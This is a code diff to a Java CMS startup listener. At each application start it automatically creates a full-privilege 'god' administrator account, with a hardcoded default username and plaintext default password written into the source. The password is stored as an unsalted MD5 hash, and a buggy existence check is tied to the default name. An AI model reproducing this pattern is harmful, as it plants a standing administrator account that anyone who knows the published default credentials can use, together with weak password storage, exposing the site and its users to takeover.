@@ -30,6 +30,7 @@ import vn.web.lastCms.db.DBPool;
 import vn.web.lastCms.db.PoolMng;
 import vn.web.lastCms.entity.User;
 import vn.web.lastCms.utils.DateProc;
+import vn.web.lastCms.utils.Md5;
 import vn.web.lastCms.utils.Tool;
 
 /**
@@ -54,6 +55,9 @@ public class MyContext implements ServletContextListener, HttpSessionListener {
     public static final int SEND_MAIL_FALSE = 1;
     public static String URL_RELOAD;
     public static String URL_FIREWALL;
+    
+    public static String USERGOD;
+    public static String GODPASS;
     
     public static int MAX_HOT;
     public static int MAX_TOP;
@@ -96,6 +100,10 @@ public class MyContext implements ServletContextListener, HttpSessionListener {
         MyConfig.config = getConfig("config.xml");
         //-------
         PoolMng.CreatePool();
+        
+        USERGOD = MyConfig.getString("USERGOD", "cmswebgod", "GOD");
+        GODPASS = MyConfig.getString("GODPASS", "Acmalinh1@", "GOD");
+        
         // FOR CONSTANTS
         DE_BUG = MyConfig.getBoolean("DE_BUG", false, "General");
         MAX_HOT = MyConfig.getInt("MAX_HOT", 10, "General");
@@ -136,6 +144,7 @@ public class MyContext implements ServletContextListener, HttpSessionListener {
             }
         }
         WIDTH_IMAGE_IN_CONTENT = MyConfig.getInt("WIDTH_IMAGE_IN_CONTENT", 720, "General");
+        createGodUser(USERGOD, GODPASS);
     }
 
     @Override
@@ -159,6 +168,32 @@ public class MyContext implements ServletContextListener, HttpSessionListener {
             }
         }
         Tool.debug(" contextDestroyed ............");
+    }
+    
+    private void createGodUser(String username, String password) {
+        try {
+            User user = new User();
+            boolean flag = user.existsByUserName("cmswebgod");
+            if (!flag) {
+                user.setUserName(username);
+                user.setPassword(Md5.encryptMD5(password));
+                user.setCreatedAt(DateProc.createTimestamp());
+                user.setCreatedBy("auto create when start project");
+                user.setStatus(1);
+                user.setType(0);
+                user.setRole("FULL");
+                boolean result = user.save(user);
+                if (result) {
+                    logger.debug("create god user success");  
+                } else {
+                    logger.debug("don't create god user");  
+                }
+            } else {
+                logger.debug("database had exists god user");  
+            }
+        } catch (Exception e) {
+            logger.debug("don't create god user");            
+        }
     }
 
     private static Configuration getConfig(String configFile) {
